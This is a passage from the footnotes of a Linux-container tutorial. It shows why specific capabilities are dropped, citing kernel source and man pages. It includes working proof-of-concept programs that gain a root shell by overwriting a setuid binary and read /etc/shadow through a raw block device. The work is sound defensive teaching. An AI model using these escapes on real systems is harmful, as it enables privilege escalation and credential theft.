=> trying a user namespace...writing /proc/852/uid_map...writing /proc/852/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ don't have CAP_MKNOD
=> cleaning cgroups...done.

```

but if we don't, they work:

Listing 27: `allow_all_caps.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..6ab1719 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -53,10 +53,7 @@ int capabilities()
 	size_t num_caps = sizeof(drop_caps) / sizeof(*drop_caps);
 	fprintf(stderr, "bounding...");
 	for (size_t i = 0; i < num_caps; i++) {
-		if (prctl(PR_CAPBSET_DROP, drop_caps[i], 0, 0, 0)) {
-			fprintf(stderr, "prctl failed: %m\n");
-			return 1;
-		}
+		continue;
 	}
 	fprintf(stderr, "inheritable...");
 	cap_t caps = NULL;

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_all_caps -m . -u 0 -c try_regain_cap
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.Qnzw2A...done.
=> trying a user namespace...writing /proc/940/uid_map...writing /proc/940/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ have CAP_MKNOD
=> cleaning cgroups...done.

```

(and if we set `+ep`, execve fails because it's considered a
"capability-dumb binary")

```

[lizzie@empress l-c-i-500-l]$ sudo setcap "cap_mknod+ep" try_regain_cap
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c try_regain_cap
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.Esog3p...done.
=> trying a user namespace...writing /proc/994/uid_map...writing /proc/994/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
execve failed! Operation not permitted.
=> cleaning cgroups...done.

```
Listing 28: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
   Safety checking for capability-dumb binaries
	A  capability-dumb binary  is an  application that  has been
	marked to have file capabilities, but has not been converted
	to  use the  libcap(3) API  to manipulate  its capabilities.
	(In  other words,  this  is  a traditional  set-user-ID-root
	program that has been switched to use file capabilities, but
	whose   code   has   not   been   modified   to   understand
	capabilities.)    For  such   applications,  the   effective
	capability  bit  is  set  on  the file,  so  that  the  file
	permitted  capabilities  are  automatically enabled  in  the
	process effective  set when executing the  file.  The kernel
	recognizes a file which has the effective capability bit set
	as capability-dumb  for the  purpose of the  check described
	here.

	When executing  a capability-dumb binary, the  kernel checks
	if the process obtained all permitted capabilities that were
	specified in  the file  permitted set, after  the capability
	transformations described  above have been  performed.  (The
	typical  reason  why  this  might  not  occur  is  that  the
	capability bounding set masked  out some of the capabilities
	in the file  permitted set.)  If the process  did not obtain
	the full set of  file permitted capabilities, then execve(2)
	fails with the error EPERM.  This prevents possible security
	risks that could arise when a capability-dumb application is
	executed with less  privilege that it needs.   Note that, by
	definition, the application could  not itself recognize this
	problem, since it does not employ the libcap(3) API.

```

[12](#fnr.12)
Listing 30: [`kernel/audit.c:663@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/audit.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n663)
```
switch (msg_type) {
case AUDIT_LIST:
case AUDIT_ADD:
case AUDIT_DEL:
	return -EOPNOTSUPP;
case AUDIT_GET:
case AUDIT_SET:
case AUDIT_GET_FEATURE:
case AUDIT_SET_FEATURE:
case AUDIT_LIST_RULES:
case AUDIT_ADD_RULE:
case AUDIT_DEL_RULE:
case AUDIT_SIGNAL_INFO:
case AUDIT_TTY_GET:
case AUDIT_TTY_SET:
case AUDIT_TRIM:
case AUDIT_MAKE_EQUIV:
	/* Only support auditd and auditctl in initial pid namespace
	 * for now. */
	if (task_active_pid_ns(current) != &init_pid_ns)
		return -EPERM;

	if (!netlink_capable(skb, CAP_AUDIT_CONTROL))
		err = -EPERM;
	break;
case AUDIT_USER:
case AUDIT_FIRST_USER_MSG ... AUDIT_LAST_USER_MSG:
case AUDIT_FIRST_USER_MSG2 ... AUDIT_LAST_USER_MSG2:
	if (!netlink_capable(skb, CAP_AUDIT_WRITE))
		err = -EPERM;
	break;
default:  /* bad msg */
	err = -EINVAL;
}

```

[13](#fnr.13)

You can obtain an audit system file descriptor by calling

```

socket(AF_NETLINK, SOCK_DGRAM, NETLINK_AUDIT)

```
Listing 31: [`man 7 netlink`](http://man7.org/linux/man-pages/man7/netlink.7.html)
```
NETLINK(7) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

NAME
	netlink  -  communication  between  kernel  and  user  space
	(AF_NETLINK)
SYNOPSIS
	[...]
	netlink_socket = socket(AF_NETLINK, socket_type, netlink_family);
	[...]
DESCRIPTION
	Netlink is  used to transfer information  between the kernel
	and  user-space  processes.   It   consists  of  a  standard
	sockets-based  interface for  user  space  processes and  an
	internal kernel API for kernel modules.
	[...]
	netlink_family selects the kernel module or netlink group to
	communicate with.   The currently assigned  netlink families
	are:
	[...]
	NETLINK_AUDIT (since Linux 2.6.6)
		Auditing.

```

[14](#fnr.14)
Listing 33: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
	CAP_BLOCK_SUSPEND (since Linux 3.5)
		Employ features that can block system suspend (epoll(7)
		EPOLLWAKEUP, /proc/sys/wake_lock).

```

[15](#fnr.15)

[An email and description by Sebastian Krahmer](http://www.openwall.com/lists/oss-security/2014/06/18/4)

> In 0.11 the problem is that the apps that run in the container have
> CAP\_DAC\_READ\_SEARCH and CAP\_DAC\_OVERRIDE which allows the containered
> app to access files not just by pathname (which would be impossible
> due to the bind mount of the rootfs) but also by handles via
> open\_by\_handle\_at(). Handles are mostly 64bit values and can be kind
> of pre-computed as they are inode-based and the inode of / is 2. So
> you can go ahead and walk / by passing a handle of 2 and search the FS
> until you find the inode# of the file you want to access. Even though
> you are containered somewhere in /var/lib.

which links to the code, [`shocker.c`](http://stealth.openwall.net/xSports/shocker.c).

Note that, if usernamespaces are on, we're not vulnerable, since
`open_by_handle_at` checks for `CAP_DAC_READ_SEARCH` in the root namespace:

```

[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker
=> validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.GSmTxw...done.
=> trying a user namespace...writing /proc/1538/uid_map...writing /proc/1538/gid_map...done.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted
=> cleaning cgroups...done.

```
Listing 35: `fs/fhandle.c:166`
```
static int handle_to_path(int mountdirfd, struct file_handle __user *ufh,
		   struct path *path)
{
	int retval = 0;
	struct file_handle f_handle;
	struct file_handle *handle = NULL;

	/*
	 * With handle we don't look at the execute bit on the
	 * the directory. Ideally we would like CAP_DAC_SEARCH.
	 * But we don't have that
	 */
	if (!capable(CAP_DAC_READ_SEARCH)) {
		retval = -EPERM;
		goto out_err;
	}
	/* ... */
}

```

[16](#fnr.16)

The setuid executable we'll subvert:

Listing 37: `harmless_setuid.c`
```
/* -*- compile-command: "gcc -Wall -Werror harmless_setuid.c -o harmless_setuid" -*- */
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>

int main (int argc, char **argv)
{
	uid_t a, b, c = 0;
	getresuid(&a, &b, &c);
	printf("I'm #%d/%d/%d\n", a, b, c);
	return 0;
}

```

This program will write itself to the executable at `argv[1]`. If it's
a setuid root executable, there's no user namespace, and `CAP_FSETID`
isn't dropped, it'll retain setuid root.

Listing 38: `cap_fsetid.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static cap_fsetid.c -o cap_fsetid" -*- */
#define _GNU_SOURCE
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>

int main (int argc, char **argv)
{
	if (argc == 2) {
		/* write our contents to the setuid file. */
		int setuid_file = 0;
		int own_file = 0;
		if ((setuid_file = open(argv[1], O_WRONLY | O_TRUNC)) == -1
		    || (own_file = open(argv[0], O_RDONLY)) == -1) {
			fprintf(stderr, "++ open failed: %m\n");
			return 1;
		}
		errno = 0;
		char here = 0;
		while (read(own_file, &here, 1) > 0
		       && write(setuid_file, &here, 1) > 0);;
		if (errno) {
			fprintf(stderr, "++ reading/writing: %m\n");
			close(setuid_file);
			close(own_file);
		}
		close(own_file);
		close(setuid_file);
	} else {
		if (setresuid(0, 0, 0)) {
			fprintf(stderr, "++ failed switching uids to root: %m\n");
			return 1;
		}
		execve("/bin/sh", (char *[]) { "sh", 0 }, NULL);
	}
	return 0;
}

```

Listing 39: `allow_capfsetid.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..17e7373 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -34,7 +34,6 @@ int capabilities()
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
 		CAP_DAC_READ_SEARCH,
-		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,

```
```

[lizzie@empress l-c-i-500-l]$ make -B harmless_setuid
cc -Wall -Werror -static harmless_setuid.c -o harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chown root harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chmod 4755 harmless_setuid
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid
I'm #1000/0/0
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./cap_fsetid harmless_setuid
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.qapCVs...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid
++ failed switching uids to root: Operation not permitted
[lizzie@empress l-c-i-500-l]$ make -B harmless_setuid
cc -Wall -Werror -static harmless_setuid.c -o harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chown root harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chmod 4755 harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capfsetid -m . -u 0 -c ./cap_fsetid harmless_setuid
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.4u1dNe...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ls -lh ./harmless_setuid
-rwsr-xr-x 1 root lizzie 788K Oct 25 05:22 ./harmless_setuid
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid
sh-4.3# whoami
root
sh-4.3# id
uid=0(root) gid=1000(lizzie) groups=1000(lizzie)
sh-4.3# exit
[lizzie@empress l-c-i-500-l]$ rm harmless_setuid

```

[17](#fnr.17)
Listing 41: [`man 2 mlock`](http://man7.org/linux/man-pages/man2/mlock.2.html)
```
DESCRIPTION
	mlock(), mlock2(),  and mlockall() lock  part or all  of the
	calling process's virtual address space into RAM, preventing
	that memory from being paged to the swap area.

	munlock() and  munlockall() perform the  converse operation,
	unlocking  part  or all  of  the  calling process's  virtual
	address  space,  so  that  pages in  the  specified  virtual
	address range may once more to be swapped out if required by
	the kernel memory manager.

	Memory locking and unlocking are performed in units of whole
	pages.

ERRORS

	ENOMEM
		(Linux  2.6.9  and  later)  the caller  had  a  nonzero
		RLIMIT_MEMLOCK soft  resource limit, but tried  to lock
		more memory  than the  limit permitted.  This  limit is
		not   enforced    if   the   process    is   privileged
		(CAP_IPC_LOCK).

```

These functions are the only use of `CAP_IPC_LOCK`; the only mention
in the source is

Listing 42: [`mm/mlock.c:27@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/mm/mlock.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n27)
```
bool can_do_mlock(void)
{
	if (rlimit(RLIMIT_MEMLOCK) != 0)
		return true;
	if (capable(CAP_IPC_LOCK))
		return true;
	return false;
}

```

[18](#fnr.18)
Listing 45: `cap_mknod.c`
```
/* -*- compile-command: "gcc -Wall -Werror -static cap_mknod.c -o cap_mknod" -*- */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#define DEV "/disk"
#define MNT "/mnt"

int main (int argc, char **argv)
{
	if (argc != 4) return 1;
	int return_code = 0;
	int etc_shadow = 0;

	dev_t dev = makedev(atoi(argv[1]), atoi(argv[2]));
	if (mknod(DEV, S_IFBLK | S_IRUSR, dev)) {
		fprintf(stderr, "++ mknod failed: %m\n");
		return 1;
	}
	if (mkdir(MNT, S_IRUSR)
	    && (errno != EEXIST)) {
		fprintf(stderr, "++ mkdir failed: %m\n");
		goto cleanup_error;
	}
	if (mount(DEV, MNT, argv[3], 0, NULL)) {
		fprintf(stderr, "++ mount failed: %m\n");
		goto cleanup_error;
	}
	if ((etc_shadow = open(MNT "/etc/shadow", O_RDONLY)) == -1) {
		fprintf(stderr, "++ opening /etc/shadow failed: %m\n");
		goto cleanup_error;
	}
	fprintf(stderr, "++ reading /etc/shadow:\n");
	char here = 0;
	errno = 0;
	while (read(etc_shadow, &here, 1) > 0)
		write(STDOUT_FILENO, &here, 1);
	if (errno) {
		fprintf(stderr, "read loop failed! %m\n");
		goto cleanup_error;
	}
	goto cleanup;
cleanup_error:
	return_code = 1;
cleanup:
	if (etc_shadow) close(etc_shadow);
	umount(MNT);
	unlink(DEV);
	rmdir(MNT);
	return return_code;
}

```

Listing 46: `allow_capmknod.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..985930e 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -38,10 +38,8 @@ int capabilities()
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
-		CAP_MKNOD,
 		CAP_SETFCAP,
 		CAP_SYSLOG,
-		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
 		CAP_SYS_MODULE,
 		CAP_SYS_NICE,

```

Note that `CAP_SYS_ADMIN` doesn't need to be allowed for this to work,
it's just that `mount` is more convenient than reading the block
device in userspace.

```

[lizzie@empress l-c-i-500-l]$  sudo  ./contained -m . -u 0 -c cap_mknod 8 1 vfat
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.VTnW1G...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ mknod failed: Operation not permitted
=> cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ make contained.allow_capmknod
patch contained.c -i allow_capmknod.diff -o contained.allow_capmknod.c
patching file contained.allow_capmknod.c (read from contained.c)
Hunk #1 succeeded at 46 (offset 8 lines).
cc -Wall -Werror -lseccomp -lcap contained.allow_capmknod.c -o contained.allow_capmknod
rm contained.allow_capmknod.c
[lizzie@empress l-c-i-500-l]$  sudo  ./contained.allow_capmknod -m . -u 0 -c cap_mknod 8 1 vfat
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.fdbi8q...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ reading /etc/shadow:
[redacted]
=> cleaning cgroups...done.

```

[19](#fnr.19)
Listing 48: `setfcap_and_exec.c`
```
/* -*- compile-command: "gcc -Wall -Werror setfcap_and_exec.c -o setfcap_and_exec  -static -lcap" -*- */
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <linux/capability.h>
#include <sys/capability.h>
#include <sys/prctl.h>
#include <sys/types.h>

int main (int argc, char  **argv)
{
	if (argc == 2 && !strcmp(argv[1], "inner")) {
		cap_t self_caps = {0};
		if (!(self_caps = cap_get_proc())) {
			fprintf(stderr, "++ cap_get_proc failed: %m\n");
			return 1;
		}

		cap_flag_value_t cap_mknod_status = CAP_CLEAR;
		if (cap_get_flag(self_caps, CAP_MKNOD, CAP_PERMITTED, &cap_mknod_status)) {
			fprintf(stderr, "++ cap_get_flag failed: %m\n");
			cap_free(self_caps);
			return 1;
		}
		if (cap_mknod_status == CAP_CLEAR)
			fprintf(stderr, "!! don't have cap_mknod+p?\n");

		if (cap_set_flag(self_caps, CAP_EFFECTIVE, 1,
				 & (cap_value_t) { CAP_MKNOD }, CAP_SET)) {
			fprintf(stderr, "++ can't cap_set_flag: %m\n");
			cap_free(self_caps);
			return 1;
		}
		if (cap_set_proc(self_caps)) {
			fprintf(stderr, "++ can't cap_set_proc: %m\n");
			cap_free(self_caps);
			return 1;
		}
		cap_free(self_caps);
		fprintf(stderr, "++ have CAP_MKNOD!\n");
	} else {
		cap_t file_caps = {0};
		if (!(file_caps = cap_from_text("cap_mknod+p"))) {
			fprintf(stderr, "++ cap_from_text failed: %m\n");
			return 1;
		}
		if (cap_set_file(argv[0], file_caps)) {
			fprintf(stderr, "++ cap_set_file failed: %m\n");
			cap_free(file_caps);
			return 1;
		}
		cap_free(file_caps);

		if (execve(argv[0], (char  *[]){ argv[0], "inner", 0 }, NULL)) {
			fprintf(stderr, "++ execve failed: %m\n");
			return 1;
		}
	}
	return 0;
}

```

Listing 49: `allow_capsetfcap.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..0f3a4e2 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -39,7 +39,6 @@ int capabilities()
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
 		CAP_MKNOD,
-		CAP_SETFCAP,
 		CAP_SYSLOG,
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capsetfcap -m . -u 0 -c setfcap_and_exec
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.GCu2Ry...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
!! don't have cap_mknod+p?
++ can't cap_set_proc: Operation not permitted
=> cleaning cgroups...done.

```

it **does** work if we don't restrict `CAP_MKNOD`, so it does seem like
processes aren't allowed to set capabilities on files that they don't have:

Listing 50: `allow_capmknod_capsetfcap.diff`
```
diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..b458201 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -38,8 +38,6 @@ int capabilities()
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
-		CAP_MKNOD,
-		CAP_SETFCAP,
 		CAP_SYSLOG,
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,

```
```

[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capmknod_capsetfcap -m . -u 0 -c setfcap_and_exec
=> validating Linux version...4.8.4-1-ARCH on x86_64.
=> setting cgroups...memory...cpu...pids...blkio...done.
=> setting rlimit...done.
=> remounting everything with MS_PRIVATE...remounted.
=> making a temp directory and a bind mount there...done.
=> pivoting root...done.
=> unmounting /oldroot.IZ1gDw...done.
=> trying a user namespace...unsupported? continuing.
=> switching to uid 0 / gid 0...done.
=> dropping capabilities...bounding...inheritable...done.
=> filtering syscalls...done.
++ have CAP_MKNOD!
=> cleaning cgroups...done.

```

This disagrees with [Brad Spengler's note in False Boundaries and
Arbitrary Code Execution](https://forums.grsecurity.net/viewtopic.php?f%3D7&t%3D2522)

> CAP\_SETFCAP: generic: can set full capabilities on a file, granting full capabilities upon exec

but that's 5 years old, so it may have changed.

[20](#fnr.20)
Listing 52: [`man 7 capabilities`](http://man7.org/linux/man-pages/man7/capabilities.7.html)
```
	CAP_SYSLOG (since Linux 2.6.37)
		*  Perform   privileged   syslog(2)  operations.    See
		   syslog(2)  for   information  on   which  operations
		   require privilege.
		*  View kernel  addresses exposed  via /proc  and other
		   interfaces  when /proc/sys/kernel/kptr_restrict  has
		   the   value  1.    (See   the   discussion  of   the
		   kptr_restrict in proc(5).)

```

Listing 53: [`man 2 syslog`](http://man7.org/linux/man-pages/man2/syslog.2.html)
```
	SYSLOG_ACTION_READ (2)
		[...] Bytes read from the log disappear from the log
		buffer [...]

	SYSLOG_ACTION_READ_ALL (3)
		[...] The call reads the   last    len   bytes    from
		the    log   buffer (nondestructively) [...]

	SYSLOG_ACTION_READ_CLEAR (4) [...]

	SYSLOG_ACTION_CLEAR (5) [...]

	SYSLOG_ACTION_CONSOLE_OFF (6) [...]

	SYSLOG_ACTION_CONSOLE_ON (7) [...]

	SYSLOG_ACTION_CONSOLE_LEVEL (8) [...]

	SYSLOG_ACTION_SIZE_UNREAD (9) [...]

	SYSLOG_ACTION_SIZE_BUFFER (10) [...]

	All commands  except 3 and  10 require privilege.

```

[21](#fnr.21)

All of the uses of `CAP_SYS_BOOT`:

Listing 56: [`kernel/reboot.c:280@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/reboot.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n280):
```
SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,
		void __user *, arg)
{
	struct pid_namespace *pid_ns = task_active_pid_ns(current);
	char buffer[256];
	int ret = 0;

	/* We only trust the superuser with rebooting the system. */
	if (!ns_capable(pid_ns->user_ns, CAP_SYS_BOOT))
		return -EPERM;

	[...]
}

```

Listing 57: [`kernel/kexec.c:187@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kexec.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n187):
```
SYSCALL_DEFINE4(kexec_load, unsigned long, entry, unsigned long, nr_segments,
		struct kexec_segment __user *, segments, unsigned long, flags)
{
	int result;

	/* We only trust the superuser with rebooting the system. */
	if (!capable(CAP_SYS_BOOT) || kexec_load_disabled)
		return -EPERM;

	[...]
}

```

Listing 58: [`kernel/kexec_file.c:256@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kexec_file.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n256):
```
SYSCALL_DEFINE5(kexec_file_load, int, kernel_fd, int, initrd_fd,
		unsigned long, cmdline_len, const char __user *, cmdline_ptr,
		unsigned long, flags)
{
	int ret = 0, i;
	struct kimage **dest_image, *image;

	/* We only trust the superuser with rebooting the system. */
	if (!capable(CAP_SYS_BOOT) || kexec_load_disabled)
		return -EPERM;
	[...]
}

```

[22](#fnr.22)
Listing 60: [`kernel/module.c:931@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n931)
```
SYSCALL_DEFINE2(delete_module, const char __user *, name_user,
		unsigned int, flags)
{
	struct module *mod;
	char name[MODULE_NAME_LEN];
	int ret, forced = 0;

	if (!capable(CAP_SYS_MODULE) || modules_disabled)
		return -EPERM;
	[...]
}

```

Listing 61: [`kernel/module.c:3468@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3468)
```
static int may_init_module(void)
{
	if (!capable(CAP_SYS_MODULE) || modules_disabled)
		return -EPERM;

	return 0;
}

```

which is called by `init_module` and `finit_module`:

Listing 62: [`kernel/module.c:3759@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3759)
```
SYSCALL_DEFINE3(init_module, void __user *, umod,
		unsigned long, len, const char __user *, uargs)
{
	int err;
	struct load_info info = { };

	err = may_init_module();
	if (err)
		return err;

	pr_debug("init_module: umod=%p, len=%lu, uargs=%p\n",
	       umod, len, uargs);

	err = copy_module_from_user(umod, len, &info);
	if (err)
		return err;

	return load_module(&info, uargs, 0);
}

SYSCALL_DEFINE3(finit_module, int, fd, const char __user *, uargs, int, flags)
{
	struct load_info info = { };
	loff_t size;
	void *hdr;
	int err;

	err = may_init_module();
	if (err)
		return err;

	pr_debug("finit_module: fd=%d, uargs=%p, flags=%i\n", fd, uargs, flags);

	if (flags & ~(MODULE_INIT_IGNORE_MODVERSIONS
		      |MODULE_INIT_IGNORE_VERMAGIC))
		return -EINVAL;

	err = kernel_read_file_from_fd(fd, &hdr, &size, INT_MAX,
				       READING_MODULE);
	if (err)
		return err;
	info.hdr = hdr;
	info.len = size;

	return load_module(&info, uargs, flags);
}

```

[23](#fnr.23)
Listing 63: [`kernel/kmod.c:630@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kmod.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n630)
```
static int proc_cap_handler(struct ctl_table *table, int write,
			 void __user *buffer, size_t *lenp, loff_t *ppos)
{
	struct ctl_table t;
	unsigned long cap_array[_KERNEL_CAPABILITY_U32S];
	kernel_cap_t new_cap;
	int err, i;

	if (write && (!capable(CAP_SETPCAP) ||
		      !capable(CAP_SYS_MODULE)))
		return -EPERM;

	[...]
}

```

which is used to authorize requests to load modules.

[24](#fnr.24)
Listing 64: [`net/core/dev_ioctl.c:349@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/dev_ioctl.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n349)
```
/**
 *	dev_load	- load a network module
 *	@net: the applicable net namespace
 *	@name: name of interface
 *
 *	If a network interface is not present and the process has suitable
 *	privileges this function loads the module. If module loading is not
 *	available in this kernel then it becomes a nop.
 */

void dev_load(struct net *net, const char *name)
{
	struct net_device *dev;
	int no_module;

	rcu_read_lock();
	dev = dev_get_by_name_rcu(net, name);
	rcu_read_unlock();

	no_module = !dev;
	if (no_module && capable(CAP_NET_ADMIN))
		no_module = request_module("netdev-%s", name);
	if (no_module && capable(CAP_SYS_MODULE))
		request_module("%s", name);
}

```

This also allows processes with only `CAP_NET_ADMIN` to load `netdev-*` modules, and
is run on almost every `ioctl` on a network device:

Listing 65: [`net/core/dev_ioctl.c:381@c8d2bc`](https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/net/core/dev_ioctl.c?id%3Dc8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n381)
```
/**
 *	dev_ioctl	-	network device ioctl
 *	@net: the applicable net namespace
 *	@cmd: command to issue
 *	@arg: pointer to a struct ifreq in user space
 *
 *	Issue ioctl functions to devices. This is normally called by the
 *	user space syscall interfaces but can sometimes be useful for
 *	other purposes. The return value is the return from the syscall if
 *	positive or a negative errno code on error.
 */

int dev_ioctl(struct net *net, unsigned int cmd, void __user *arg)
{
	[...]
	/*
	 *	See which interface the caller is talking about.
	 */

	switch (cmd) {
	/*
	 *	These ioctl calls:
	 *	- can be done by all.
	 *	- atomic and do not require locking.
	 *	- return a value
	 */
	case SIOCGIFFLAGS:
	case SIOCGIFMETRIC:
	case SIOCGIFMTU:
	case SIOCGIFHWADDR:
	case SIOCGIFSLAVE:
	case SIOCGIFMAP:
	case SIOCGIFINDEX:
	case SIOCGIFTXQLEN:
